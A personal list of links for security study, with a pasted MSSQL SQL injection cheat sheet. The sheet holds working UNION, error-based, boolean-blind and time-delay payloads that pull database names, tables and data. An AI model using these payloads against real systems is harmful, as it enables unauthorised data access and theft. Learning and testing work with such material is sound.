[github resource]
https://github.com/yo-yo-yo-jbo?tab=repositories

[Operating System]
https://oliviagallucci.com/how-does-os-affect-binary-exploitation/


[ADB Protocol]
https://www.synacktiv.com/publications/diving-into-adb-protocol-internals-12

[Firmware Course]
https://www.youtube.com/watch?v=HgGwqG1Fiao&list=PLUFkSN0XLZ-ltETI20mpXOCdqC8rdven6

[Academic Course]
http://csg.csail.mit.edu/6.S983/notes/


[Virtualization]
Intro: https://lnkd.in/eKjbSmmP
VMWare: https://lnkd.in/eC_vjg7Z
Xen: https://lnkd.in/eZZpn8jb
QEMU: https://lnkd.in/e5hV22c7


[Interesting Resources]
http://web.mit.edu/tytso/www/interesting-places.html

[Must Read Blog]
https://raydenchia.com/

[Research]
https://www.usenix.org/conference/fast17/call-for-papers
http://www.eecg.toronto.edu/~ashvin/
http://research.cs.wisc.edu/adsl/Software/
https://www.usenix.org/conference/woot16
http://spw16.langsec.org/papers.html
https://www.vusec.net/people/herbert-bos/
https://www.sigsac.org/ccs/CCS2016/wp-content/uploads/2016/08/Open-TOC-CCS.html
https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS
https://www.usenix.org/conferences
http://7h3ram.blogspot.fi/2012/07/exploit-mitigation-techniques-on-linux.html
https://www.usenix.org/system/files/conference/woot17/woot17-paper-grothe.pdf
https://www.codeproject.com/Articles/1216535/Deep-Learning: Walk through
https://secdev.ieee.org/2018/program-committee/

[Reverse Engineering]
https://www.pwnthebox.net/reverse/engineering/and/binary/exploitation/series/2019/03/25/reverse-engineering-and-binary-exploitation-series-mainpage.html
https://intezer.com/blog/malware-analysis/malware-reverse-engineering-beginners/
https://intezer.com/blog/incident-response/malware-reverse-engineering-for-beginners-part-2/
https://github.com/RUB-NDS : Ruhr University Bochum - Chair for Network and Data Security

[Binary Analysis Result]

http://www.binaryanalysis.org/en/content/show/documentation

[Source Code Review]
https://www.youtube.com/watch?v=rAwxFw25x3E

[Other University Team]
https://csg.utdallas.edu/
http://nds.rub.de/media/ei/lehrmaterialien/praktikum-zur-hacktechnik/links.pdf

[Binary Analysis]
https://rng.mistakenot.net/disasm-eval/


[Fuzzer]
https://github.com/google/syzkaller
ftrace : debugged

[Malware]
(https://cysinfo.com/7th-meetup-reversing-and-investigating-malware-evasive-tactics-hollow-process-injection/)[https://cysinfo.com/7th-meetup-reversing-and-investigating-malware-evasive-tactics-hollow-process-injection/]

[Password List]
https://github.com/danielmiessler/SecLists/tree/master/Passwords

[Windows Security]
https://adsecurity.org/?page_id=1821


[Applied Cryptography]
https://www.youtube.com/watch?v=LdzzeePMebg => Daniel DJB
https://www.youtube.com/@BillBuchanan
https://cseweb.ucsd.edu/~mihir/cse107/slides.html
https://picoctf.com/crypto_mats/
http://www.theamazingking.com/crypto.php
https://www.amazon.com/Cryptanalysis-Study-Ciphers-Their-Solution/dp/0486200973/
http://www.garykessler.net/library/crypto.html
https://www.dlitz.net/software/pycrypto/
http://cryptoservices.github.io/challenges/
https://www.cs.auckland.ac.nz/~pgut001/policy/
https://www.cs.auckland.ac.nz/~pgut001/tutorial/index.html
https://www.youtube.com/watch?v=2aHkqB2-46k : finish it first 
https://csg.utdallas.edu/presentations/crypto/
https://pthree.org/page/2/ : Very nice writeup
https://www.youtube.com/watch?v=vdr74e7D9IU&list=UUjuzfkiC_uYm-WL1CJw9BYg&index=97 : Mark Stamp
https://www.youtube.com/watch?v=VDSznMMOaHE&list=PL-SStBoAJuw0vj8MgTFhY5y9wSFnjGbOB : Mihar Bellary


[Crypt-Talk]
https://www.youtube.com/watch?v=HvzAR__EIgQ
https://www.youtube.com/watch?v=grRi-aFrbSE
PUDDLE, CRIME, BEAST, 

RuhrSec 2016 "Transport Layer Security – TLS 1.3 and backwards security issues", Jörg Schwenk
https://www.youtube.com/watch?v=iFS25HfTe20 => Cryptanalysis



[Free Training]
https://www.youtube.com/c/JohnHammond010/playlists : Nice for CTF writeup walk through
http://opensecuritytraining.info/Training.html
https://www.youtube.com/playlist?list=PLF58FB7BCB20ED11A
https://www.youtube.com/playlist?list=PLUFkSN0XLZ-nXcDG89jS9iqKBnNHmz7Qw: Reverse Engineering
https://www.youtube.com/playlist?list=PLUFkSN0XLZ-mWD8E-08bQNRRzK6bT12Fi: Browser 
http://opensecuritytraining.info/External_Resources.html
http://opensecuritytraining.info/Exploits1.html: Finish First
http://mooc.fi/courses/2016/cybersecurity/
https://www.youtube.com/channel/UCl_G9Ob-N5kgWq_of-9N_jQ
http://www.wjscheirer.com/teaching/security/yr2017sp/home_resources.php
https://plus.google.com/events/cl2jjhpfiu9ihssuom51hl6nqa0: Letcure1
https://plus.google.com/events/c71o6m98fst16cdon6j09hrs170: 2
https://plus.google.com/events/cl2parhnjt43qfoq2e09bbtakjs: 3
https://plus.google.com/events/coe45a5b3l00b4idjh39hi2ofsc: 4
https://plus.google.com/events/cif6odt8rr0t5qon9kn4rrk7ub4: 5
https://plus.google.com/events/cfhoop7t1gjfj8521qal2op0gqs: 6
https://plus.google.com/events/c3k62bjbejqask8oeo0k9g7udfs: 7
https://plus.google.com/events/cuka83ubhrsc8kdntqb358b31bo: 8
https://plus.google.com/events/c5m09sqo2rqskq3ddv7m3fniges: 9


[XSS]
http://phpsecurity.readthedocs.io/en/latest/Cross-Site-Scripting-(XSS).html


[Web Security]
http://docs.spring.io/spring-security/site/docs/current/reference/html/headers.html
https://spring.io/blog/2013/08/23/spring-security-3-2-0-rc1-highlights-security-headers/
http://spring.io/blog/2014/01/21/webinar-replay-spring-security-3-2
https://www.udemy.com/burp-suite/learn/v4/t/lecture/4170162
https://www.owasp.org/index.php/OWASP_Juice_Shop_Project : Vulnerable Applications

[SQL Injection and Web Application Firewall]

http://phrack.org/issues/69/12.html
https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities
https://www.youtube.com/watch?v=rdyQoUNeXSg&feature=relmfu
   | |
   | |
 --  --
 \    /
   \ /
https://www.youtube.com/watch?v=qBVThFwdYTc
https://www.youtube.com/user/j0emccray/videos
https://www.youtube.com/watch?v=UDHEKOrp78g
[ERROR BASED SQL INJECTION]
https://perspectiverisk.com/mssql-practical-injection-cheat-sheet/
=========================================================================================================================
This website stores cookies on your computer. These cookies are used to improve your website experience and provide more personalized services to you, both on this website and through other media. To find out more about the cookies we use, see our Privacy Statement.

We won't track your information when you visit our site. But in order to comply with your preferences, we'll have to use just one tiny cookie so that you're not asked to make this choice again.

Accept Decline
Skip to content↑



Request a Quote

Name*
Organisation*
Email*
Phone*
Message*

MSSQL Practical Injection Cheat Sheet
Search for:
Search …
Resources
Blog
Success Stories
Categories
Categories
Archives
Archives
Following on from my MySQL Injection Practical Cheat Sheet here is the MSSQL version.

As before, I will list the injections by their categories: union based, error based and inferential (time and boolean). Wherever you see @@version below (used to find the database version), you can replace it with:

 

db_name() – to extract database name
user_name() or user()- to extract the username the database runs under
@@servername – to extract the server name
host_name() – to extract the host name

 

Note that, in the below examples I am injecting into an integer field; for example, products.asp?id=1 <injection here>. As it’s an integer field I don’t need to use a single quote to close off the previous injection (this is usually the case for integer fields); however, if you’re injecting into a string field, be sure to use the quote!

 

UNION
 

UNION is used to append our malicious query onto the end of a valid query issued by the web application. Remember to find the number of columns first using ORDER BY or UNION with NULL values. Assuming there’s three columns:

 

Extract database version:

1 UNION SELECT NULL,@@version,NULL--
Extract database names (change N to a number starting from 1):

1 UNION SELECT NULL,DB_NAME(N),NULL--
1 UNION SELECT NULL,name,NULL FROM master ..sysdatabases--
 

Extract table names:

 

1 UNION SELECT NULL,TABLE_NAME,NULL FROM information_schema.TABLES--
1 UNION SELECT NULL,name,NULL FROM sysobjects WHERE xtype = 'U'--
Extract column names (replace table1):

 

1 UNION SELECT NULL,column_name,NULL FROM information_schema.COLUMNS-- will extract all columns (regardless of table)
1 UNION SELECT TABLE_NAME,column_name,NULL FROM information_schema.COLUMNS-- will line up tables with columns
1 UNION SELECT NULL,name,NULL FROM syscolumns WHERE id =(SELECT id FROM sysobjects WHERE name = 'table1')-- will extract columns from a specific table in the current database
Extract data (change column1 and table1):

 

1 UNION SELECT NULL,column1,NULL FROM table1--
Extract table names from another database (replace other_database with database name)

 

1 UNION SELECT NULL,name,NULL FROM other_database..sysobjects WHERE xtype = 'U'--
Extract column names from another database (replace other_database and other_table):

 

1 UNION SELECT other_database..syscolumns.name, TYPE_NAME(other_database..syscolumns.xtype),NULL FROM other_database..syscolumns, other_database..sysobjects WHERE other_database..syscolumns.id=other_database..sysobjects.id AND other_database..sysobjects.name='other_table'--
Extract data from another database (replace other_database, other_table and other_column):

 

1 UNION SELECT NULL,other_column,NULL FROM other_database..other_table--
Error Based
CONVERT

 

This technique is very similar to the MySQL double query error based injection (discussed in my previouspost) in that an error is forced; however, a valid MSSQL query is included which gets executed first, leading to the results of the query being displayed in the error message. In the below examples, be sure to encode + with %2b if inputting directly into the address bar. There are two ways of performing this attack, with the first listed below being the quickest.

 

Method 1 – Quicker

 

Extract database version:

 

1 AND 1=CONVERT(INT,@@version)--
Extract number of databases:

 

1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT([name]) AS nvarchar(4000)) FROM [master]..[sysdatabases] )+CHAR(58)+CHAR(58)))--
Extract database names (replace N with a number starting from 1):

1 AND 1=CONVERT(INT,db_name(N))--
1 AND 1=CONVERT(INT,(SELECT CAST(name AS nvarchar(4000)) FROM master..sysdatabases WHERE dbid=N))--
Extract table count:

1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM information_schema.TABLES )+CHAR(58)+CHAR(58)))--
Extract table names (replace N with a number starting from 1):

1 AND 1= CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
To extract column names (replace table1 with appropriate table name):

1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--
To extract data, first count the entries in the table (replace table1 with appropriate table name):

1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM table1)+CHAR(58)+CHAR(58)))--
 

Then, assuming the columns we wish to extract from are called column1 and column2:

1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 1 column1 , column2 FROM table1 ORDER BY column1  ASC) sq ORDER BY column1  DESC)+CHAR(58)+CHAR(58)))--
The second top 1 should be incremented to extract subsequent rows:

1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 column1+CHAR(58)+column2 FROM (SELECT top 2 column1, column2 FROM table1 ORDER BY column1 ASC) sq ORDER BY column1 DESC)+CHAR(58)+CHAR(58)))--
Extract tables from another database (change other_database and increase N):

1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 TABLE_NAME FROM (SELECT DISTINCT top N TABLE_NAME FROM other_database.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC)+CHAR(58)))--
Extract columns from another database (change other_database, other_table and increase N):

1 AND 1=CONVERT(INT,(CHAR(58)+(SELECT DISTINCT top 1 column_name FROM (SELECT DISTINCT top N column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table' ORDER BY column_name ASC) sq ORDER BY column_name DESC)+CHAR(58)))--
See how many data entries there are in another database (change other_database and other_table):

 1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 CAST(COUNT(*) AS nvarchar(4000)) FROM [other_database]..[other_table] )+CHAR(58)+CHAR(58)))--
Extract data from another database (change other_database, other_table, other_column and increase N):

 

 1 AND 1=CONVERT(INT,(CHAR(58)+CHAR(58)+(SELECT top 1 other_column FROM (SELECT top N other_column FROM other_database..other_table ORDER BY other_column ASC) sq ORDER BY other_column DESC)+CHAR(58)+CHAR(58)))--
Method 2 – Slower

 

Extract database names (replace N with a number starting from 1):

 

1 AND 1=CONVERT(INT,db_name(N))--
Extract first table name:

 

1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES))--
As this had extracted the first table’s name (table1 in the example below), we add that to the query to enumerate the next table, like so:

1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1')))--
Further tables can then be enumerated by adding table names to the query. The following query would extract the third table name:

 

1 AND 1=CONVERT(INT,(SELECT top 1 TABLE_NAME FROM information_schema.TABLES WHERE TABLE_NAME NOT IN ('table1', 'table2')))--
Columns are then enumerated in the same manner as before (replace table1):

1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))--
1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1')))--
1 AND 1=CONVERT(INT,(SELECT top 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name NOT IN ('column1', 'column2')))--
Extract data (replace column1 and table1):

1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1))--
1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1')))--
1 AND 1=CONVERT(INT,(SELECT top 1 column1 FROM table1 WHERE column1 NOT IN ('result1', 'result2')))--
HAVING and GROUP BY

 

Some basic enumeration of the current database can be performed by forcing errors through the use ofHAVING and GROUP BY.

 

1 HAVING 1=1--
Will reveal the current table and the first column name in a table_name.column_name format.

 

The second column name can be enumerated with:

 

1 GROUP BY table1.column1 HAVING 1=1--
The second column name can then be added to the query to reveal the third column name:

 

1 GROUP BY table1.column1, table1.column2 HAVING 1=1--
If the page no longer errors when adding columns, there are none left to enumerate.

 

Inferential
 

When no data or error messages are returned, inferential injections (aka blind injections) can be used to ‘infer’ database information by using time based or boolean responses. This is done by using theSUBSTRING function to break up query results into individual characters which can be enumerated separately. The characters are entered using the ASCII function via their decimal codes, which can be ascertained by using this ASCII chart. The LOWER function is also used to ensure we only have to deal with lower case characters (up until the point of actual data retrieval).

 

In the case of time delay injections, thus, we are effectively asking the database: “if the first character of the database user’s name is S, wait 10 seconds before returning the page”. If the first character is not S, the page will return immediately. In the case of boolean injections, the expected page will return if the query evaluates to true and a differing page will return if the query evaluates to false.

 

When making inferential injections, it’s often useful to determine how many characters are in the piece of data you’re trying to extract. In MSSQL, this can be achieved by wrapping the injection in LEN .

 

Boolean

 

Extract version length:

 

1 AND LEN(@@version)&gt;5--
Extract first character of version:

1 AND ASCII(LOWER(SUBSTRING((@@version),1,1)))&gt;97--
By increasing the SUBSTRING start argument, you can extract the second character in the version, like so:

1 AND ASCII(LOWER(SUBSTRING((@@version),2,1)))&gt;97--
Extract databases (replace N):

 

1 AND LEN(DB_NAME())&gt;5--
1 AND ASCII(LOWER(SUBSTRING((DB_NAME(N)),1,1)))&gt;97--
Extract 1st table:

 

1 AND LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'))&gt;5--
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),1,1)))&gt;97--
Extract 2nd table (replace table1 with the first table’s name):

 

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name &gt;'table1'),1,1)))&gt;97--
Extract 3rd table (replace table2 with the second table’s name):

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name&gt;'table2'),1,1)))&gt;97--
Extract 1st column (replace table1):

 

1 AND LEN((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))&gt;5--
1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97--
Extract 2nd column (replace table1 and column1):

 

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1' AND column_name &gt;'column1'),1,1)))&gt;97--
Extract 1st field of column1 (replace column1 and table1):

 

1 AND LEN((SELECT TOP 1 column1 FROM table1))&gt;5--
1 AND ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1),1,1))&gt;65--
Extract 1st field of column2 (replace column1 and table1):

1 AND LEN((SELECT TOP 1 column2 FROM table1))&gt;5--
1 AND ASCII(SUBSTRING((SELECT TOP 1 column2 FROM table1),1,1))&gt;65--
 

Extract 2nd field of column1 (replace column1,table1 and field1):

1 AND ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1 WHERE column1 &gt;'field1'),1,1))&gt;65--
Extract table 1 from another database (replace other_database)

 

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM other_database..sysobjects WHERE xtype='U'),1,1)))&gt;97--
Extract 1st column from another database (replace other_database and other_table):

1 AND ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='other_table'),1,1)))&gt;97--
Extract data from another database (replace other_database, other_table and other_column):

 

1 AND ASCII(SUBSTRING((SELECT TOP 1 other_column FROM other_database..other_table),1,1))&gt;65--
Time
Time based MSSQL injections use the WAITFOR function to produce an attacker specified delay in page loading if the query given evaluates to true.
Extract version:

1; IF LEN(@@version)&gt;5 WAITFOR DELAY '00:00:15'--
1; IF ASCII(LOWER(SUBSTRING((@@version),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
 

Extract DB Name (replace N):

 

1; IF(LEN(DB_NAME())&gt;5 WAITFOR DELAY '00:00:15'--
1; IF ASCII(LOWER(SUBSTRING((DB_NAME(N)),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
Extract 1st table:

 

1; IF (LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'))&gt;5) WAITFOR DELAY '00:00:15'--
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
Extract 2nd table (replace table1):

 

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name&gt;'table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
Extract 3rd table (replace table2):

 

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U' AND name&gt;'table2'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
To extract 1st column (replace table1):

 

1; IF LEN((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'))&gt;5 WAITFOR DELAY '00:00:15'--
1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
To extract 2nd column (replace table1 and column1):

 

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'  AND column_name &gt;'column1' ),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
Extract 1st field of column 1 (replace table1 and column1):

 

1; IF LEN((SELECT TOP 1 column1 FROM table1))&gt;5 WAITFOR DELAY '00:00:15'--
1; IF ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
Extract 1st field of column 2 (replace table1 and column1):

 

1; IF LEN((SELECT TOP 1 column2 FROM table1))=3 WAITFOR DELAY '00:00:15'--
1; IF ASCII(SUBSTRING((SELECT TOP 1 column2 FROM table1),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
Extract 2nd field of column 1 (replace column1,table1 and field1):

1; IF ASCII(SUBSTRING((SELECT TOP 1 column1 FROM table1 WHERE column1 &gt;'field1'),1,1))&gt;65 WAITFOR DELAY '00:00:15'--
Extract 1st table from another database (replace other_database):

 

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM other_database..sysobjects WHERE xtype='U'),1,1)))=117 WAITFOR DELAY '00:00:15'--
Extract 1st column from another database (replace other_database and other_table):

 

1; IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 column_name FROM other_database.information_schema.COLUMNS WHERE TABLE_NAME='table1'),1,1)))&gt;97 WAITFOR DELAY '00:00:15'--
Extract 1st field of column 1 from another database (replace other_database, other_table and other_column):

 

1; IF (ASCII(SUBSTRING((SELECT TOP 1 other_column FROM other_database..other_table),1,1))&gt;65) WAITFOR DELAY '00:00:15'--
Sources Used
The above information was took from a variety of sources, including:
Kaotic Creation’s article on blind SQL injections
Kaotic Creation’s article on CONVERT error based injections
Pentest Monkey’s MSSQL injection cheat sheet
CWH Underground’s ‘Full MSSQL Injection PWNage’ paper

 

Some other resources I recommend are:
Acuforum – an online vulnerable web app hosted by Acunetix
SQLZoo – a great online test bed

Perspective Risk logo
Twitter icon Faceook icon Linkedin icon
© Perspective Risk Ltd. 40 Bernard St, London, WC1N 1LE. Company No: ​07296612 Registered in England and Wales.

Latest Blogs
android vulnerability security
Vulnerability discovered by Perspective Risk’s Senior Security Consultant, Calum Hutton. […]

cta arrowRead Full Blog
cyber security snake
Seven Things You Can Do to Reduce Your Risks In […]

cta arrowRead Full Blog

dialog featured image
Download our Guide to the Modern Workplace
A Strategic Guide for IT Directors and CIOs on how to transform your organisation with Microsoft 365.

Download now


=========================================================================================================================
[Malware Analysis]
https://courses.zero2auto.com/

https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/
http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/

[Learn From Youtube]
https://www.youtube.com/c/JohnHammond010/playlists ===> VERY NICE

[Fun Practice]
https://www.praetorian.com/challenges/
http://canyouhack.us/
https://microcorruption.com/login
http://smashthestack.org
http://overthewire.org/wargames/
https://exploit-exercises.com
http://cryptoservices.github.io/challenges/
https://cryptopals.com/
https://www.hackthebox.eu/

[CTP Writeup]
https://trailofbits.github.io/ctf/
http://shell-storm.org/
https://www.corelan.be/
http://blog.ioactive.com/
http://computer-forensics.safemode.org/
https://kitctf.de/learning/getting-started/


[Find Sample Exploit]
http://www.exploit-db.com/papers/
http://www.securityfocus.com/
http://www.fuzzysecurity.com/
https://technet.microsoft.com/en-us/sysinternals/bb842062.aspx
https://github.com/superponible
http://www.cs.fsu.edu/~lawrence/OffNetSec/lectures.htmlhttp://www.cs.fsu.edu/~lawrence/OffNetSec/lectures.html
http://blog.ptsecurity.com/2017/08/disabling-intel-me.html
https://sploitfun.wordpress.com/

[Virtualization]
http://pve.proxmox.com/wiki/DRBD
http://pve.proxmox.com/wiki/Main_Page
http://openvz.org/Main_Page
http://web.stanford.edu/class/cs259d/

[Operating System and System Programming]
http://cs162.eecs.berkeley.edu/
http://ospp.cs.washington.edu/slides.html
http://codex.cs.yale.edu/avi/os-book/OS9/practice-exer-dir/index.html
http://www.cl.cam.ac.uk/~rja14/book.html
http://www.securitybook.net/home/presentations
https://www.rlove.org/
http://duartes.org/gustavo/blog/post/journey-to-the-stack/
http://blog.tinola.com/?e=5 : system call info


[Bug Hunting]
http://www.cse.ust.hk/~gfan/docs/fangang_pqe.pdf


[Data Structure and Algorithm]
http://courses.csail.mit.edu/6.851/spring12/lectures/L01.html

[Exploit Development]
http://www.thegreycorner.com/
http://www.securitysift.com/windows-exploit-development-part-1-basics/
http://www.primalsecurity.net/0x8-exploit-tutorial-the-elusive-egghunter/
https://sploitfun.wordpress.com/


[C-Programming]
http://c.learncodethehardway.org/book/
http://www.nasm.us/xdoc/2.11/html/nasmdoc0.html
https://trailofbits.github.io/ctf/vulnerabilities/references/Dowd_ch06.pdf
http://www.iu.hio.no/~mark/CTutorial/C-Tut-4.02.pdf

[Blogs]
https://www.vusec.net/projects/drammer/
http://duartes.org/gustavo/blog/post/memory-translation-and-segmentation/
http://seclists.org/oss-sec/2017/q1/569


[Shell Coding]
http://www.vividmachines.com/shellcode/shellcode.html
http://www.nasm.us/xdoc/2.11/html/nasmdoc0.html

[Abstract Computer Science]
https://www.cs.princeton.edu/courses/archive/fall06/cos341/handouts/mathcs.pdf

[SageMath]
https://cocalc.com/help?session=default

[Scripting]
[Bash Scripting]
https://github.com/azet/community_bash_style_guide

[Digital Forensic]
http://www.ghettoforensics.com/2016/05/grrcon-2015-memory-forensics-grabbing.html

[SSH Tunneling]
https://artkond.com/2017/03/23/pivoting-guide/

[Assembly Language]
[https://wiki.skullsecurity.org/Assembly


[Books- Awesome]
http://programming-motherfucker.com/become.html#Vim
https://www.chemie.fu-berlin.de/chemnet/use/info/cpp/cpp.html
http://www.primalsecurity.net/primalsec-blog/

[Source Code Auditing]
https://github.com/struct/mms
http://www.cs.usfca.edu/~ejung/courses/686/syllabus.html

[Browser Security]
https://www.html5rocks.com/en/tutorials/internals/howbrowserswork/
https://caniuse.com
https://haveibeenpwned.com
https://web.dev/articles/howbrowserswork


[Windows Low Level Stuffs]
https://redops.at/en/blog/shell-we-assemble-unleashing-x86-inline-assembly-for-shellcode-execution

[Individual Blogs]
https://www.ripstech.com/
[Active Directory]
https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/
https://thesprawl.org/research/
http://wiki.osdev.org/Stack_Smashing_Protector
http://www.productive-cpp.com/hardening-cpp-programs-executable-space-protection-address-space-layout-randomization-aslr/
https://www.metabrik.org/blog/category/forensic/
https://blog.skullsecurity.org/author/ron
https://blog.g0tmi1k.com/: Guy from OSCP
https://github.com/NetSPI/PESecurity
https://kiddiescode.wordpress.com/2017/01/18/278/
https://www.linkedin.com/search/results/content/?keywords=%23VulnHub&origin=HASH_TAG_FROM_FEED
https://github.com/tintinweb
https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos
https://github.com/iagox86/ctfworkshop-2017/blob/master/PRIMER.md

[News]
https://security-center.intel.com/advisory.aspx?intelid=INTEL-SA-00086&languageid=en-fr
https://motherboard.vice.com/en_us/article/59yexk/princeton-study-session-replay-scripts-tracking-you
